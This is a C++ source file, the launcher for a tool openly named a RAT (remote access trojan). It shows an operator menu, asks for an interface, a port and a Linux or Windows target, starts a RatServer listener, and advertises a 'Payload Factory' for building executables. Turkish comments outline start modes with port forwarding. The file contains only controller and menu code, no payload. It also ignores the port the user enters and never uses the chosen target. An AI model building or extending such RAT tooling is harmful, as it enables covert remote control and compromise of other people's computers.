#include "../include/csock.hpp"
#include "../include/utils.hpp"
#include "../include/ratServer.hpp"
#include <iomanip>

using namespace std;

void targetInfo();
void ratInfo();

int main(){
    int chooseMenu = -1;
    int targetSystem = 0;

    std::vector<string> selectedInterface(2);
    

    ratInfo();
    std::cout << "[TEM-RAT-STARTER] : " << "select action $";
    cin >> chooseMenu;
    
    switch(chooseMenu){
        case 1:{
            short no = -1;
        
            {
                std::vector<std::vector<std::string>> interfaceV4 = utils_getLAN_IPV4(true);
                cout << "[TEM-RAT-STARTER] : " << "select interface ip : ";
                cin >> no;
        
                if(no < 0 || no >= interfaceV4.size()){
                    std::cerr << "INVALID CHOOSING !" << "\n"; 
                    return 0x1;
                }
                selectedInterface[0] = string(interfaceV4[no][0]); //interface
                selectedInterface[1] = string(interfaceV4[no][1]); //ip
            }
        
            uint portNo = 0;
            cout << "Server Port : ";
            cin >> portNo;
        
            if(portNo == 0)
                portNo = CSOCK_DEFAULT_PORT;
        
            
            targetInfo();
            cout << "[TEM-RAT-STARTER] : " << "select target system : ";
            cin >> targetSystem;
        
        
            
            cout << "[TEM-RAT-SERVER] : Server Running " << selectedInterface[1] << ":" << portNo << " Address" << "\n";
            RatServer rs(CSOCK_DEFAULT_PORT,selectedInterface[1],IPV4,TCP,false,true);

            break;
        }


    }
   
    
    

    return 0x0;
}

void targetInfo(){

cout << setw(10) << std::left << "No" 
     << setw(20) << std::left << "Target System" << "\n";

cout << "--------------------------------------------" << "\n";

cout << setw(10) << std::left << TARGET_LINUX 
     << setw(20) << std::left << "Linux" << endl; 

cout << setw(10) << std::left << TARGET_WINDOWS 
     << setw(20) << std::left << "Windows" << endl; 
}


void ratInfo(){

    cout << setw(15) << std::left << "[TEM-RAT-MENU]" << "\n";
    cout << setw(10) << std::left << "No" 
         << setw(20) << std::left << "Action" << "\n";
    
    cout << "--------------------------------------------" << "\n";
    
    cout << setw(10) << std::left << 1
         << setw(20) << std::left << "Start RAT Server" << endl; 
                /*
                    (TCP-IPV4 otomatik baslatma PORT YONLENDIRMESIZ)
                    1.1.1-ip
                    1.1.2-port
                    1.1.3-port yonlendirme (istege bagli)
                    1.1.4-hedef sistem secimi

                    (MANUEL BASLATMA PORT YONLENDIRMESIZ)
                    1.2.1

                    (otomatik BASLATMA PORT yonlendirme)
                    1.3.1

                    (manuel baslatma port yonlendirme)
                    1.4.1

                */

    cout << setw(10) << std::left << 2 
         << setw(20) << std::left << "Payload Factory (Runtime/Executable)" << endl;
}